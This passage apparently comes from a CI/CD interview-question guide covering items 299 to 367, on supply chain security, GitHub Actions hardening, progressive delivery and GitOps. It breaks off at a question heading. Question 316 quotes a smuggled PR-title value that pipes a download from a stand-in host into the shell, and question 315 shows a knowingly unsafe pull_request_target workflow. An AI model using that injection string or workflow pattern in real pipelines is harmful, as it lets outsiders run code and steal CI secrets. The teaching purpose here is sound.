## 299: How would you add a manual rollback workflow?

Make a workflow that takes a version as input and deploys it with the same deploy steps as normal releases.

```yaml
on:
  workflow_dispatch:
    inputs:
      version:
        description: "Image tag to deploy, for example v1.4.1"
        required: true
        type: string

jobs:
  rollback:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v6
      - run: ./scripts/deploy.sh "${{ inputs.version }}"
```

It's best if rollback uses the exact same script as deploys, so it's tested every time you deploy. Validate the input (for example that the tag exists) before running.

## 300: How do you document a pipeline for the team?

- A short README section: what runs on PRs, what runs on main, how to deploy and roll back.
- Comments in the YAML for anything that isn't obvious.
- Clear job and step names, so logs read like a checklist.
- A runbook for common failures: what to do when deploy fails, how to rerun, who to contact.
- Owners in CODEOWNERS for pipeline files.

The best documentation is a pipeline that is simple enough that people don't need much of it.

# Advanced Questions (301-450)

## 301: How would you design CI/CD for a company with 100 microservices?

- **Shared templates**: one set of reusable workflows or CI components (build, test, scan, deploy) that every service uses, versioned with tags. Teams can extend them but don't copy-paste pipelines.
- **One artifact per service**: a container image tagged with the commit SHA, plus SBOM and signature.
- **Independent deploys**: each service deploys on its own schedule. No "release day" that ships all 100 together.
- **GitOps for deployment**: a config repo (or folder per service) that Argo CD or Flux syncs, with promotion from staging to production by PR or automation.
- **Contract tests** instead of a huge shared E2E environment.
- **Progressive delivery** with canaries and automatic rollback based on metrics.
- **A platform team** that owns runners, templates and tooling, and tracks DORA metrics across teams.

The goal is that adding service number 101 takes an hour, not a week.

## 302: What are the CI trade-offs between a monorepo and many repos?

| Monorepo                                        | Many repos (polyrepo)                         |
| ----------------------------------------------- | --------------------------------------------- |
| Atomic changes across projects in one PR        | Cross-repo changes need several PRs and order |
| Needs affected-only builds and caching to scale | Each pipeline is small and simple             |
| One CI config to maintain, can get complex      | Many configs, which tend to drift apart       |
| Shared tooling and versions are easy            | Dependency versions differ between repos      |
| A broken main can block everyone                | Failures stay inside one repo                 |

Monorepos need investment in build tooling (Nx, Turborepo, Bazel) and merge queues. Polyrepos need investment in shared templates and dependency update bots.

## 303: What makes build systems like Bazel different from npm scripts?

Bazel (and similar tools like Buck2 and Pants) model the build as a graph of targets, where every target declares all its inputs and outputs. Because inputs are known exactly, the tool can:

- Rebuild and retest only targets affected by a change
- Cache every target's output by input hash, locally and remotely
- Run actions on remote machines (remote execution) in parallel

The cost is that you must declare everything, write BUILD files and often give up the usual package manager workflow. It pays off in very large repos with many languages, and is usually overkill for a normal web app.

## 304: What is a hermetic build?

A hermetic build depends only on inputs that are declared and pinned: source code, exact tool versions, exact dependency versions. It doesn't read anything from the machine or network that isn't part of those inputs, like a globally installed compiler or "whatever version of curl is on the runner".

Hermetic builds give the same result on any machine, make caching safe, and are a requirement for reproducible builds. In practice you get close with pinned base images (by digest), lock files, pinned toolchains and no network access during the build step.

## 305: What is a reproducible build and why does it matter?

A build is reproducible if building the same source twice gives bit-for-bit identical output. That lets anyone confirm that a binary really came from the claimed source code, which matters for supply chain security.

Common sources of differences: timestamps in files and archives, file order in archives, embedded build paths, random IDs and unpinned dependencies. Fixes include setting `SOURCE_DATE_EPOCH`, sorting files, stripping paths and pinning everything. Docker BuildKit supports `SOURCE_DATE_EPOCH` for image timestamps.

## 306: What is software supply chain security in CI/CD?

It's about protecting everything between a developer's commit and what runs in production: source code, dependencies, build tools, CI system, artifacts and registries. Attackers increasingly go after these steps instead of the app itself, because one compromised package or CI system can reach thousands of targets.

Main defenses:

- Protect source: branch protection, reviews, signed commits
- Protect dependencies: lock files, scanning, careful updates, private proxies
- Protect the build: ephemeral runners, least-privilege tokens, pinned actions
- Protect artifacts: signing, provenance, SBOMs
- Verify at deploy: only run signed artifacts from trusted builds

## 307: What is SLSA?

SLSA (Supply-chain Levels for Software Artifacts, said "salsa") is a framework from the OpenSSF that defines levels of build integrity. In SLSA 1.0, the build track has levels:

- **Level 1**: the build produces provenance (a record of how it was built)
- **Level 2**: provenance is signed and the build runs on a hosted build platform
- **Level 3**: the build platform is hardened, so builds are isolated and provenance can't be faked by the build's own steps

It gives teams a shared way to talk about how trustworthy their artifacts are. GitHub artifact attestations and the SLSA GitHub generator can help reach higher levels.

## 308: What are build provenance attestations?

Provenance is signed metadata that says where an artifact came from: which repo, commit, workflow, and runner built it. An attestation is that statement bound to the artifact's digest and signed.

```yaml
permissions:
  id-token: write
  attestations: write
  contents: read
steps:
  - run: npm run build && tar -czf app.tgz dist
  - uses: actions/attest-build-provenance@v3
    with:
      subject-path: app.tgz
```

Consumers can then check it, for example with `gh attestation verify app.tgz --repo my-org/my-app`. It proves the artifact was built by your pipeline and not uploaded by someone with stolen registry credentials.

## 309: How does keyless signing with Sigstore work?

Sigstore's `cosign` can sign artifacts without you managing a private key:

1. The CI job gets an OIDC token from its CI provider.
2. Sigstore's Fulcio service issues a short-lived certificate tied to that identity (for example "workflow X in repo Y").
3. Cosign signs the artifact with a temporary key, and the signature is recorded in the public transparency log Rekor.

```bash
cosign sign --yes ghcr.io/my-org/app@sha256:abc123...
cosign verify ghcr.io/my-org/app@sha256:abc123... \
  --certificate-identity-regexp "https://github.com/my-org/app/.github/workflows/release.yml@.*" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

Verification checks the identity, not a key. There is no key that can leak or needs to be rotated.

## 310: How do you make sure only trusted images run in Kubernetes?

Use an admission controller that checks images before pods are created:

- **Kyverno** or **Sigstore policy-controller** verify cosign signatures and attestations.
- **OPA Gatekeeper** enforces rules like "images must come from our registry" or "no `latest` tags".

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-images
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/my-org/*"]
          attestors:
            - entries:
                - keyless:
                    issuer: https://token.actions.githubusercontent.com
                    subject: "https://github.com/my-org/*"
```

Even if someone pushes a malicious image to the registry, the cluster refuses to run it.

## 311: What is a dependency confusion attack?

Your company uses an internal package called `@acme-internal/utils` or `acme-utils` from a private registry. An attacker publishes a package with the same name on the public npm registry with a higher version number. If the build is set up to check both registries, the package manager may pick the public one and run the attacker's code during install.

Defenses:

- Use scoped packages (`@acme/...`) and map the scope to the private registry in `.npmrc`.
- Register your scope or names on the public registry too.
- Use a registry proxy that only allows approved sources.
- Lock files with integrity hashes.

## 312: How do you protect CI from malicious npm packages?

- Use `npm ci` with a committed lock file, so versions and integrity hashes are fixed.
- Don't auto-merge fresh dependency versions. Some teams wait a few days after release (Renovate's `minimumReleaseAge`, and pnpm and npm have similar settings) since many malicious versions are found and removed within hours.
- Turn off install scripts where you can (`npm ci --ignore-scripts`, or pnpm, which doesn't run dependency build scripts unless you allow them).
- Keep secrets out of the install job. Install in a job without credentials, and deploy in a separate job.
- Use a registry proxy with malware scanning.

Self-spreading attacks on npm in 2025 stole tokens from CI and developer machines through install scripts, so these steps are not just theory.

## 313: What was the tj-actions/changed-files incident and what are the lessons?

In March 2025 the popular `tj-actions/changed-files` action was compromised. The attacker changed its version tags to point to a malicious commit that printed the runner's memory, including secrets, into the workflow logs. Public repos using it had their secrets exposed in public logs.

Lessons:

- Pin third-party actions to full commit SHAs, not tags.
- Give workflows minimal `permissions` and secrets.
- Prefer actions from trusted publishers, or copy small ones into your own org.
- Use runner security tools that limit network egress.
- Have a process to find every repo using an action and rotate affected secrets fast.

## 314: What is poisoned pipeline execution?

Poisoned pipeline execution (PPE) is when an attacker who can change code that the pipeline runs uses it to run their own commands with the pipeline's access. Types:

- **Direct**: changing the pipeline file itself in a branch or PR.
- **Indirect**: changing files the pipeline runs, like a `Makefile`, test script, or `package.json` script.
- **Public**: doing either through a PR from a fork on a public repo.

Defenses: don't give secrets to pipelines triggered by untrusted code, separate build from deploy, protect deploy credentials with environment rules that require main and approvals, and review pipeline-related files with CODEOWNERS.

## 315: What is a "pwn request" in GitHub Actions?

It's an attack on workflows triggered by `pull_request_target` (or `workflow_run`) that check out and run code from the PR.

```yaml
# Dangerous
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test # runs attacker's code with secrets
```

Because `pull_request_target` has secrets and a write token, the attacker's `package.json` scripts or tests run with them. Fix: use `pull_request` for anything that runs PR code. If you need privileges, split into an unprivileged workflow that builds and a privileged one that only handles the results as data.

## 316: What is script injection in GitHub Actions?

Expressions like `${{ github.event.pull_request.title }}` are pasted into the script as text before the shell runs. If an attacker controls that value, they can inject commands.

```yaml
# Dangerous: a PR title like  "; curl evil.sh | sh #  runs code
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Fix by passing untrusted values through environment variables, which the shell treats as data:

```yaml
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Untrusted fields include PR titles and bodies, issue comments, branch names, commit messages and author names. `actionlint` and `zizmor` can detect this pattern.

## 317: Why are self-hosted runners on public repositories dangerous?

Anyone can fork a public repo and open a PR. If workflows run on your self-hosted runner for PRs, a stranger's code runs on your machine. On a persistent runner, they can install a backdoor that waits for the next job with secrets, read files from other jobs, or reach your internal network.

GitHub warns against this. If you must, use ephemeral runners in isolated networks, require approval for outside contributors, and never use the same runner pool for trusted deploy jobs.

## 318: What is cache poisoning in CI?

If an untrusted job can write to a cache that a trusted job later reads, an attacker can put malicious files in the cache, like a modified `node_modules` package or build tool. The trusted job (for example a release on main) then restores and runs it.

In GitHub Actions, caches from PR branches can't be read by the default branch, which helps, but a workflow on the default branch that runs untrusted code (like `pull_request_target`) can still write poisoned entries. Defenses: don't run untrusted code in default-branch contexts, use separate cache keys for release builds, or don't use caches at all for release jobs.

## 319: How can secrets leak from a pipeline even with masking?

- The value is transformed before printing: base64, URL encoding, JSON escaping, split across lines.
- A tool writes it into a file that is uploaded as an artifact, like a debug log or a `.npmrc`.
- It's baked into a Docker image layer through `ARG` or `ENV`, and the image is pushed.
- A compromised action or dependency sends it over the network.
- It's put in an output or cache.
- A multi-line secret like a private key is masked only line by line or not reliably.

Use BuildKit secret mounts (`RUN --mount=type=secret`) for build-time secrets, keep secrets out of jobs that don't need them, and prefer short-lived credentials so a leak is less harmful.

## 320: How do you restrict an OIDC trust policy correctly?

The cloud role trusts tokens from the CI provider, so you must limit which repos and branches can assume it, using the token's `sub` (subject) claim. A policy that only checks the issuer lets any repository on GitHub assume your role.

```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-app:environment:production"
    }
  }
}
```

Tying the subject to an environment means only jobs that passed that environment's protection rules (like reviewers and branch rules) get production access. Use separate roles for plan and apply, and for each environment.

## 321: How do short-lived credentials improve pipeline security?

Long-lived keys stored as secrets can be copied and used later, from anywhere, until someone notices and rotates them. Short-lived credentials (from OIDC, Vault dynamic secrets, or cloud STS) expire in minutes or hours, so a leaked value stops working soon.

Vault can even create a database user just for one job and delete it afterwards. This turns "a secret leaked" from a long incident into a much smaller event. The main work is setting up trust between the CI provider and the systems it needs.

## 322: How do you rotate a secret used by many pipelines without downtime?

1. Create the new credential while the old one still works (most systems allow two active keys or passwords).
2. Update the secret in the CI tool or secret manager.
3. Run or wait for pipelines and apps to pick up the new value.
4. Check that nothing uses the old one (access logs, last-used dates).
5. Revoke the old credential.

Storing secrets in one place (org-level secrets or a secret manager) instead of copying them into 50 repos makes this much easier. Better still, replace them with OIDC where you can so there is nothing to rotate.

## 323: How do you enforce separation of duties in deployments?

Many rules (like SOC 2 or PCI DSS) say the person who writes a change should not be the only one who can approve and deploy it. In CI/CD:

- Require at least one reviewer who is not the author before merging.
- Use protected environments where the author can't approve their own deployment (GitHub has a "prevent self-review" option).
- Only the pipeline can deploy. Developers have no direct production credentials.
- All of this is logged, which serves as audit evidence.

This keeps the control without manual hand-offs to a separate ops team.

## 324: How do you protect the pipeline configuration itself?

- Rulesets or branch protection on `main` so workflow changes need review.
- CODEOWNERS on workflow folders, templates and scripts used by pipelines.
- Required workflows or required templates at org level that teams can't remove (GitHub rulesets can require workflows; GitLab has pipeline execution policies and compliance pipelines).
- Pin shared templates and reusable workflows by tag or SHA.
- Environment protection rules, so even a modified workflow on a branch can't access production.

## 325: How do deployment branch rules on environments help?

You can say which branches or tags are allowed to deploy to an environment, like "only `main`" or "only tags matching `v*`".

Without this, someone could push a branch with a changed workflow that targets the production environment and reads its secrets. With branch rules, that job is blocked before it starts, even if the YAML says `environment: production`. Combined with OIDC subjects that include the environment, it's a strong barrier.

## 326: How would you harden a Jenkins installation?

- Run no builds on the controller (0 executors).
- Use ephemeral agents (Kubernetes pods or cloud VMs).
- Keep Jenkins and plugins updated, and remove unused plugins. Plugins are the main source of vulnerabilities.
- Use the Role-based Authorization Strategy or Matrix Authorization, and SSO.
- Keep script security on, and be careful approving Groovy scripts.
- Scope credentials to folders, not globally.
- Put Jenkins behind a VPN or SSO proxy, not open on the internet.
- Back up `JENKINS_HOME` and keep configuration as code (JCasC).

## 327: How do you isolate jobs from each other on shared infrastructure?

- Use ephemeral runners: a new VM or container per job.
- If you use containers, prefer VM-level isolation (like Firecracker or gVisor) for untrusted code, since container escapes are possible.
- Don't mount the Docker socket into job containers.
- Separate runner pools for trusted (deploy, release) and untrusted (PR) jobs.
- Limit network access from runners to what jobs actually need.
- Don't share caches or workspaces between trust levels.

## 328: How do you limit network access from CI runners?

Most pipeline attacks need to send stolen data somewhere. Limiting outgoing traffic makes that much harder.

- On self-hosted runners, use firewall rules or proxies that only allow known hosts: your Git host, registries, package mirrors, cloud APIs.
- On GitHub-hosted runners, tools like StepSecurity Harden-Runner can watch and block unexpected outgoing connections.
- Use private registry mirrors so builds don't need open internet access.

Start in audit mode to learn what the build really calls, then switch to blocking.

## 329: How do you scale self-hosted runners?

- **Kubernetes**: Actions Runner Controller (ARC) with runner scale sets for GitHub, the GitLab Runner Kubernetes executor, or the Jenkins Kubernetes plugin. Runners are created as pods when jobs are queued and removed after.
- **VMs**: autoscaling groups, GitLab's Docker Autoscaler and Instance executors with fleeting plugins, or tools like the Terraform AWS GitHub runner module.

Watch queue time as the main signal. Keep a small warm pool if cold starts are slow, and use spot or preemptible instances for cost, with jobs that tolerate being interrupted.

## 330: What are the trade-offs of using spot instances for CI runners?

Spot (or preemptible) instances can cost 60-90% less than normal ones, and CI jobs are short and repeatable, so they fit well.

The risk is that the cloud provider can take the machine back with little warning, killing running jobs. That's fine for test jobs that can be retried, but bad for deploys or very long jobs. A common setup is spot for PR builds and tests, on-demand for deploy and release jobs, with automatic retry on runner loss.

## 331: Why is queue time an important CI metric?

Queue time is how long a job waits for a free runner before it starts. Teams often only look at run time, but if jobs wait 10 minutes in a queue, the pipeline is slow no matter how fast the jobs are.

High queue time usually means too few runners at peak hours, too many jobs per pipeline, or a pool for special runners (macOS, GPU) that's too small. Fix with autoscaling, fewer unnecessary jobs, or concurrency limits for low-priority work.

## 332: How do you observe CI pipelines at scale?

Treat CI like a production system:

- Collect metrics per workflow and job: duration, queue time, success rate, retry rate, cost.
- Export traces: there are tools and OpenTelemetry integrations that turn pipeline runs into traces, with jobs and steps as spans, so you can see the critical path.
- Track test-level data: slowest tests, flaky tests, failure reasons.
- Dashboards and alerts for things like "main has been red for 30 minutes" or "queue time over 5 minutes".

Without data, "CI is slow" stays a feeling, and you can't tell if a change made it better.

## 333: How do you detect and manage flaky tests across a large codebase?

- Record every test result with test ID, commit and pass/fail, from every run.
- A test that both passes and fails on the same commit is flaky by definition.
- Compute a flakiness score per test over time.
- Automatically quarantine tests above a threshold: they still run but don't block merges, and a ticket is created for the owning team.
- Remove tests from quarantine once they are stable, or delete them if nobody fixes them.

Tools like Trunk Flaky Tests, BuildPulse and features in Datadog CI Visibility do this. Large companies like Google run tests many times to measure flakiness.

## 334: What is test impact analysis?

Test impact analysis runs only the tests affected by a change, instead of the whole suite. It works by:

- **Static analysis**: follow imports from changed files to the tests that use them (Jest's `--findRelatedTests`, Vitest's `--changed`, Nx affected).
- **Coverage mapping**: record which code each test touches, then select tests whose covered code changed.

It can cut test time a lot, but it can miss things like config files, data files or dynamic imports. A common safety net is running the full suite on main or nightly.

## 335: What is predictive test selection?

Predictive test selection uses a machine learning model trained on past test results to guess which tests are most likely to fail for a given change, and runs those first or only those. Meta and Google have written about it, and tools like Launchable and Develocity offer it.

It can reduce test time a lot on huge suites while catching most failures. The risk is missing a failure, so it's used with full runs later in the pipeline, not as the only check.

## 336: How do you design good cache keys for build caching?

A cache key must include everything that can change the result, and nothing that doesn't:

- Lock file hashes for dependencies
- OS and CPU architecture
- Tool versions (Node, compiler)
- Relevant config files (for example `tsconfig.json`, bundler config)
- Environment variables that affect the build

Too few inputs gives wrong cache hits (the worst case, because builds look fine but use stale output). Too many inputs gives no hits at all. Tools like Nx and Turborepo let you declare `inputs` and `env` per task, and you should check them when you add new config.

## 337: What problems can happen when a build cache gives wrong results?

- A build passes in CI because it restored an old output, while a clean build would fail.
- A release ships stale code or stale generated files.
- Tests are "cached as passed" even though code they depend on changed, because that dependency wasn't declared.
- Different machines get different results for the "same" cache key.

Detect it by running clean builds regularly (for example nightly or for releases), and investigate any case where clean and cached results differ. For release artifacts, many teams turn off task caching entirely.

## 338: How do you keep Docker layer caching on ephemeral runners?

Ephemeral runners start with an empty Docker cache, so you need to store the cache outside the runner:

- `type=gha`: GitHub Actions cache (limited by cache size)
- `type=registry`: push cache layers to a registry tag, like `my-app:buildcache`
- `type=s3` or `type=azblob`: object storage
- Remote BuildKit builders that keep their own cache (Docker Build Cloud, self-hosted BuildKit, Depot)

```bash
docker buildx build \
  --cache-from type=registry,ref=ghcr.io/my-org/app:buildcache \
  --cache-to type=registry,ref=ghcr.io/my-org/app:buildcache,mode=max \
  -t ghcr.io/my-org/app:"$GITHUB_SHA" --push .
```

`mode=max` caches all stages, not just the final one, which matters for multi-stage builds.

## 339: How do you speed up checkout of a very large repository in CI?

- **Shallow clone** (`fetch-depth: 1`) if you don't need history.
- **Partial clone** (`--filter=blob:none`) to get history without file contents until needed.
- **Sparse checkout** to get only the folders the job needs.
- **Reference repos or cached mirrors** on self-hosted runners.
- Avoid big binary files in Git, use Git LFS and fetch LFS files only when needed.

```yaml
- uses: actions/checkout@v6
  with:
    sparse-checkout: |
      apps/web
      packages/ui
    filter: blob:none
```

## 340: Why should CI test the merge result instead of the branch alone?

A branch can pass on its own and still break main once merged, because main changed since the branch was created. For example, someone renamed a function on main while your branch added a new call to the old name. Both pass alone. Together they don't compile.

GitHub's `pull_request` event tests the merge commit with the current base, which helps, but it's tested at the time of the push, not the time of the merge. Merge queues and "require branch to be up to date" close that gap.

## 341: How do merge queues handle many PRs efficiently?

Testing one PR at a time would be slow on a busy repo. Merge queues test speculatively:

- PR A is tested as `main + A`, PR B as `main + A + B`, PR C as `main + A + B + C`, all in parallel.
- If all pass, they merge in order.
- If B fails, B is removed and C is re-tested as `main + A + C`.

Some queues can also group several PRs into one batch and test them together, and split the batch if it fails. Settings like maximum group size and build concurrency trade CI cost for throughput.

## 342: How do you do trunk-based development safely at scale?

- Small PRs, merged at least daily.
- Feature flags for anything not ready, with clear owners and removal dates.
- Fast, reliable CI with required checks and a merge queue.
- Branch by abstraction for big refactors: add an interface, switch implementations behind it step by step.
- Progressive delivery so problems are caught with few users affected.
- Strong monitoring and fast rollback.

The biggest risks are flag debt (hundreds of old flags) and the habit of merging untested code "because it's behind a flag". Code behind a flag still needs tests for both states.

## 343: What is progressive delivery?

Progressive delivery is releasing changes gradually and in a controlled way, with automatic checks at each step. It builds on continuous delivery with:

- Canary releases and traffic shifting
- Feature flags with percentage rollouts and targeting
- Automated analysis of metrics to decide go or rollback
- Blast radius control: internal users, then one region, then everyone

Tools: Argo Rollouts, Flagger, Spinnaker, cloud-native options like AWS CodeDeploy, and feature flag platforms.

## 344: How does automated canary analysis work?

The system compares metrics from the canary with the baseline (the stable version, ideally a fresh baseline deployed at the same time with the same traffic share) and gives a score.

1. Pick metrics: error rate, p95 and p99 latency, CPU and memory, maybe business metrics.
2. Collect them for both groups over a time window.
3. Run statistical tests to see if the canary is meaningfully worse.
4. Promote, pause or roll back based on the result.

Kayenta (from Netflix and Google) is a known tool for this. Argo Rollouts and Flagger use simpler threshold queries against Prometheus, Datadog and others. The main difficulty is noise: with little traffic, differences are hard to detect.

## 345: How does Argo Rollouts work?

Argo Rollouts replaces the normal Kubernetes Deployment with a `Rollout` resource that supports canary and blue-green steps.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: api
spec:
  replicas: 10
  strategy:
    canary:
      steps:
        - setWeight: 10
        - pause: { duration: 5m }
        - analysis:
            templates:
              - templateName: error-rate
        - setWeight: 50
        - pause: { duration: 10m }
  selector:
    matchLabels:
      app: api
  template:
    metadata:
      labels:
        app: api
    spec:
      containers:
        - name: api
          image: ghcr.io/my-org/api:3f2a1c9
```

`AnalysisTemplate` resources define metric queries and success conditions. With a traffic router (Istio, NGINX, AWS ALB, Gateway API), weights are exact. Without one, it approximates by replica counts.

## 346: How do you shift traffic precisely during a canary?

Replica-based splitting is rough: with 4 pods, the smallest step is 25%. For exact percentages, use a layer that routes requests by weight:

- A service mesh (Istio, Linkerd) with weighted routes
- Ingress or Gateway API `HTTPRoute` with weighted backends
- Cloud load balancers with weighted target groups (AWS ALB)
- CDN or edge routing for frontends

You can also route by header or cookie, so for example internal users or a specific customer always get the canary. This is useful for testing in production before any real customer sees the change.

## 347: How can SLOs and error budgets be used as deployment gates?

An SLO (service level objective) is a target like "99.9% of requests succeed over 30 days". The error budget is the allowed failure: 0.1%.

- During canary analysis, block promotion if the canary burns the budget much faster than normal.
- If the error budget for the period is used up, freeze non-critical deploys and focus on reliability work.
- Use burn-rate alerts after deploys to trigger rollback.

This connects deploy decisions to what users actually feel, instead of arbitrary thresholds.

## 348: How do you do a zero-downtime database migration, step by step?

Example: renaming `users.name` to `users.full_name` with a rolling deploy. Use expand and contract:

1. **Expand**: add the new column `full_name` (nullable). Old code ignores it.
2. **Dual write**: deploy code that writes to both columns, still reads `name`.
3. **Backfill**: copy existing data from `name` to `full_name` in batches.
4. **Switch reads**: deploy code that reads `full_name`, still writes both.
5. **Stop old writes**: deploy code that only uses `full_name`.
6. **Contract**: in a later release, drop `name`.

Every step works with the version before and after it, so a rollback at any point is safe. It takes several deploys, which is why fast pipelines matter.

## 349: How do you run large data backfills as part of a deployment?

- Don't run them inside the schema migration transaction. Long transactions lock tables and can block production.
- Run them as a separate job or background worker, in small batches with pauses, so the database isn't overloaded.
- Make them idempotent and resumable, so you can stop and restart.
- Track progress, and only deploy the code that depends on the data once the backfill is finished.
- Watch replication lag and database load while it runs.

For very large tables, tools like `gh-ost` or `pt-online-schema-change` (MySQL) or careful use of `CREATE INDEX CONCURRENTLY` (Postgres) avoid long locks.

## 350: How do you keep services compatible during a rolling deploy?

During a rolling deploy, old and new versions run at the same time and talk to the same database, caches, queues and other services. So:

- APIs: only add fields, don't remove or rename them in the same release. Make new fields optional.
- Messages and events: consumers must handle both old and new formats. Version your schemas.
- Caches: new code must handle cache entries written by old code, and the other way around.
- Sessions and tokens: both versions must read them.
- Frontend and backend: the backend must support the previous frontend version, since users may have old tabs open.

Think of every deploy as "two versions running together for a while", not an instant switch.

## 351: What is different about deploying stateful services?

Stateless services can be killed and replaced freely. Stateful ones (databases, message brokers, search clusters, services with local disk) can't:

- Instances have identity and data, so Kubernetes uses StatefulSets with ordered, one-at-a-time updates.
- Upgrades may need data format changes, so you must follow the vendor's upgrade path (often one major version at a time).
- Rolling back can be impossible once data was written in a new format.
- Leader election and replication need care, for example upgrading replicas first and the primary last.

Many teams use managed services (RDS, Cloud SQL, managed Kafka) so the provider handles this, and keep their own pipelines for stateless apps.

## 352: How do you evolve event or message schemas without breaking consumers?

- Use a schema format with clear compatibility rules: Avro, Protobuf or JSON Schema.
- Use a schema registry (Confluent Schema Registry, AWS Glue Schema Registry) that rejects incompatible changes.
- Only make backward compatible changes: add optional fields with defaults, never remove required fields or change types.
- For breaking changes, publish a new version or a new topic, run both for a while, move consumers, then retire the old one.

Run the compatibility check in CI, so a producer PR fails before a breaking schema reaches production.

## 353: What do you do when a release includes a migration that can't be reversed?

Plan for it before deploying, because during an incident is too late:

- Split the change so the irreversible part (like dropping a column) ships separately, well after the code that needs it is stable.
- Take a backup or snapshot right before the migration and know how long a restore takes.
- Make sure the previous app version still works with the new schema, so you can roll back the code without rolling back the database.
- If that's not possible, treat the release as roll-forward only and have people ready to fix forward.

The best approach is to avoid this situation by using expand and contract.

## 354: How does "can-i-deploy" work in contract testing?

With Pact, each service publishes its contracts and verification results to the Pact Broker, tagged with the version and the environments it's deployed to. Before deploying, the pipeline asks the broker:

```bash
pact-broker can-i-deploy \
  --pacticipant checkout-service \
  --version "$GIT_SHA" \
  --to-environment production
```

The broker checks if this version is compatible with the versions of all its consumers and providers currently in production. If not, the deploy is blocked. After deploying, the pipeline records the deployment with `record-deployment`. This lets services deploy independently without a shared E2E environment.

## 355: How do you manage the cost of ephemeral environments at scale?

A full copy of the stack for every PR gets expensive fast. Ways to reduce it:

- Share heavy parts (databases, message brokers) and isolate only by schema or namespace.
- Deploy only the changed services and route the rest to a shared staging environment (request routing by header, like with mirrord, Signadot or a service mesh).
- Use database branching (Neon, PlanetScale, Supabase branching) instead of a full database per PR.
- Scale to zero when nobody is using them, and delete them after a few days.
- Make them opt-in with a PR label for changes that need them.

## 356: What does "testing in production" mean, and is it a good idea?

It means checking changes with real traffic and real infrastructure, in a controlled way, because staging can never fully match production. It doesn't mean skipping tests. Techniques:

- Canary releases and feature flags for a small group of users
- Dark launches and shadow traffic
- Synthetic checks against production
- Observability to see the effect of each change

It's a good idea when combined with strong pre-production testing, small blast radius and fast rollback. It's a bad idea as a replacement for testing.

## 357: What is a dark launch?

A dark launch means deploying a new feature to production and running it with real traffic, but without users seeing it. For example, the new search service gets every query and computes results, but users still see results from the old one.

This tests performance, load and errors in real conditions before release. When it looks good, you switch users to the new feature, often with a feature flag.

## 358: What is shadow traffic (traffic mirroring)?

Shadow traffic copies real production requests to the new version, while only the old version's responses go back to users. You can compare the two versions' responses, latency and errors.

Service meshes like Istio can mirror traffic. The big danger is side effects: if the shadow service writes to the database, sends emails or charges cards, mirrored requests will do it twice. So shadow only read paths, or point the shadow at fake downstream services.

## 359: How would you design a feature flag system?

- **Flag store**: flags and rules stored in a service or database, managed through a UI or as code.
- **SDKs** in apps that fetch rules and evaluate locally (fast, works if the flag service is down) or call an API.
- **Targeting**: by user ID, percentage, region, plan, internal users.
- **Consistent bucketing**: hash the user ID so a user stays in the same group.
- **Defaults and fallbacks**: if config can't be loaded, use a safe default.
- **Audit log** of who changed what and when.
- **Lifecycle**: owners, expiry dates, alerts for stale flags.

OpenFeature is a vendor-neutral standard API for flags, so you can switch providers without rewriting code.

## 360: What is a kill switch?

A kill switch is a feature flag that turns off a feature or a dependency quickly in an emergency, without a deploy. For example, turning off recommendations when the recommendation service is overloaded, so the product page still loads.

Good kill switches are tested regularly, documented in runbooks, and work even when other parts of the system are down (so they shouldn't depend on the failing service).

## 361: How do you deploy to multiple regions safely?

- Deploy to one region first (often the one with least traffic or a "canary region"), wait and watch, then go on to the others.
- Never deploy to all regions at the same time, so one bad change can't take everything down.
- Make sure each region can be rolled back on its own.
- Watch for region-specific config and data.
- Keep traffic failover between regions working, so you can move users away from a bad region.

Large cloud providers deploy this way, in waves across regions, with bake time between them.

## 362: What are ring or wave deployments?

A ring deployment releases to groups of users in order, from lowest to highest risk:

1. Ring 0: the team itself or internal employees
2. Ring 1: a small set of early adopters or one region
3. Ring 2: a larger share
4. Ring 3: everyone

Each ring must stay healthy for a set time before the next one starts. Microsoft uses this for Windows and Office. It's similar to canary releases but usually on a longer time scale and with fixed groups.

## 363: What is bake time?

Bake time is how long a change runs in an environment or ring before moving to the next one. Some problems only show up after a while: memory leaks, daily batch jobs, cache expiry, weekly traffic patterns, certificate rotation.

Short bake times give faster delivery. Long bake times catch more slow-burning problems. Many teams use short bake times for low-risk services and longer ones for critical infrastructure.

## 364: Are deployment freezes a good idea?

A freeze (no deploys during holidays, big sales or launch events) reduces the chance of changes causing problems at the worst time. But it has costs:

- Changes pile up, so the first deploy after the freeze is big and risky.
- Urgent fixes still need a way through, so you need an exception process.
- It can hide a lack of trust in the pipeline.

A middle ground is a "soft freeze": only low-risk changes and fixes, with extra approval. Teams with strong CI/CD often freeze less, because each change is small and easy to undo.

## 365: How do you handle secrets in a GitOps setup?

You can't put plain secrets in Git. Common solutions:

- **External Secrets Operator**: the manifest in Git only references a secret in AWS Secrets Manager, Vault, Azure Key Vault or GCP. The operator fetches the value into a Kubernetes Secret.
- **Sealed Secrets**: secrets encrypted with the cluster's public key. Only the controller in the cluster can decrypt them.
- **SOPS**: files encrypted with KMS or age keys, decrypted by Flux or an Argo CD plugin.

External Secrets is the most common choice today, since secrets stay in the secret manager and rotation doesn't need a Git commit.

## 366: How would you structure GitOps repositories?

Common choices:

- **Separate app and config repos**: app repos have code, CI builds images. A config repo has manifests for all environments. Clear permissions, and CI commits to config don't trigger app CI.
- **Folder per environment** (`envs/dev`, `envs/staging`, `envs/prod`) with Kustomize overlays or Helm values. Simple, and promotion is a PR copying a change.
- **Branch per environment**: possible but usually discouraged, because merging between branches gets messy.

Keep production changes behind PR review, and keep environment differences small and explicit.

## 367: How do you promote changes between environments in GitOps?

